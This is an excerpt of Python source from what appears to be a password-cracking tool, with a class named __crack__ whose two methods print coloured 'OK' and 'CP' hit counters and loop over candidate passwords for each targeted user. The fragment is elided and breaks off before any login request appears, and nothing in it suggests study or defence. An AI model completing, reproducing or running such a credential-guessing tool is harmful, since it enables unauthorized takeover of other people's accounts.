...
class __crack__():
    ...
    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r%s%s ( + ) TEST: %s OF %s  \x1b[1;92mOK\x1b[1;97m:\x1b[1;92m %s + \x1b[1;93mCP\x1b[1;97m:\x1b[1;93m %s \x1b[1;97m' % (O, N, loop, len(self.id), len(SAW), len(NO))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
    ...
    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mSA\xe2\x99\xa1SULTANI%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(SAW), len(NO))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
